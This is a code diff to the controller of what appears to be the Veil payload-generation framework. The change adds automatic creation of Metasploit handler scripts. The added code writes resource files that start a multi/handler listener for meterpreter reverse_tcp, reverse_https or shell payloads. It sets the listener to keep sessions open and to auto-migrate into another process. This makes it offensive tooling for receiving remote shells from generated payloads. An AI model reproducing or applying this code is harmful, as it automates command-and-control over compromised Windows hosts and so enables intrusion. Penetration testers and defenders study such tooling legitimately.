@@ -305,6 +305,7 @@ class Controller:
     def OutputMenu(self, payload, code, showTitle=True, interactive=True, OutputBaseChoice=""):
         """
         Write a chunk of payload code to a specified ouput file base.
+        Also outputs a handler script if required from the options.
 
         code = the source code to write
         OutputBaseChoice = "payload" or user specified string
@@ -360,6 +361,21 @@ class Controller:
             else:
                 message += "\n Shellcode:\t\t" + payload.shellcode.msfvenompayload
 
+                # if the shellcode wasn't custom, build out a handler script
+                handler = "use exploit/multi/handler\n"
+                handler += "set PAYLOAD " + payload.shellcode.msfvenompayload + "\n"
+                handler += "set LHOST 0.0.0.0\n"
+                
+                # extract LPORT if it's there
+                p = re.compile('LPORT=(.*?) ')
+                parts = p.findall(payload.shellcode.msfvenomCommand)
+                if len(parts) > 0:
+                    handler += "set LPORT " + parts[0] + "\n"
+
+                handler += "set ExitOnSession false\n"
+                handler += "set AutoRunScript post/windows/manage/migrate\n"
+                handler += "exploit -j\n"
+
             # print out any msfvenom options we used in shellcode generation if specified
             if len(payload.shellcode.options) > 0:
                 message += "\n Options:\t\t"
@@ -380,7 +396,58 @@ class Controller:
                 t += " " + key + "=" + payload.required_options[key][0] + " "
             message += t.strip()
 
-        message += "\n Source File:\t\t"+OutputFileName + "\n"
+            # check if any options specify that we should build a handler out
+            keys = payload.required_options.keys()
+
+            if "LHOST" in keys:
+
+                handler = "use exploit/multi/handler\n"
+                # do our best to determine the payload type
+
+                # handle options from the backdoor factory
+                if "payload" in keys:
+                    p = payload.required_options["payload"][0]
+                    if "tcp" in p:
+                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
+                    elif "https" in p:
+                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                    elif "shell" in  p:
+                        handler += "set PAYLOAD windows/shell_reverse_tcp\n"
+                    else: pass
+
+                # if not BDF, try to extract the handler type from the payload name
+                else:
+                    if "tcp" in payload.shortname.lower():
+                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
+                    elif "https" in payload.shortname.lower():
+                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                    elif "http" in payload.shortname.lower():
+                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                    else: pass
+
+                handler += "set LHOST 0.0.0.0\n"
+
+                if "LPORT" in keys:
+                    handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
+
+                handler += "set ExitOnSession false\n"
+                handler += "set AutoRunScript post/windows/manage/migrate\n"
+                handler += "exploit -j\n"
+
+
+        message += "\n Payload File:\t\t"+OutputFileName + "\n"
+
+        # if we're generating the handler script, write it out
+        try:
+            if settings.GENERATE_HANDLER_SCRIPT.lower() == "true":
+                handlerFileName = settings.HANDLER_PATH + FinalBaseChoice + "_handler.rc"
+                handlerFile = open(handlerFileName, 'w')
+                handlerFile.write(handler)
+                handlerFile.close()
+                message += " Handler File:\t\t"+handlerFileName + "\n"
+        except:
+            # is that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
+            print helpers.color("\n [!] Please run ./config/update.py !", warning=True)
 
         # print out notes if set
         if hasattr(payload, 'notes'):
